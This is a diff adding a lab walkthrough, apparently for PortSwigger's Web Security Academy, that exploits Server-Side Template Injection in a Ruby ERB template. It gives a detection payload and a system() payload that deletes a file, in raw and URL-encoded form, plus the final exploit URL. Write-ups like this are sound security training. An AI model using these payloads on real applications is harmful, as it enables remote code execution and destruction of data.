@@ -1,0 +1,41 @@
+Description:
+This lab is vulnerable to Server-Side Template Injection (SSTI) due to unsafe construction of an ERB template.
+
+Steps to Solve:
+1️-Identify the Injection Point
+-When viewing details of a product, a GET request uses the parameter:
+message
+-This parameter is reflected on the home page.
+
+2️-Test for SSTI
+-From ERB documentation:
+<%= someExpression %>
+-Test with a simple payload:
+<%= 7*7 %>
+
+-URL-encoded payload:
+<%25%3d+7*7+%25>
+
+-Insert it into the URL:
+https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>
+
+If the result 49 is rendered → the application is vulnerable to SSTI.
+
+3️-Achieve Remote Code Execution (RCE)
+-From Ruby documentation, use:
+system()
+-Payload:
+<%= system("rm /home/carlos/morale.txt") %>
+
+4️-Exploit the Vulnerability
+-URL-encoded payload:
+<%25+system("rm+/home/carlos/morale.txt")+%25>
+
+-Final exploit:
+
+https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
+
+Result:
+-Arbitrary OS command execution achieved
+-File deleted:
+/home/carlos/morale.txt
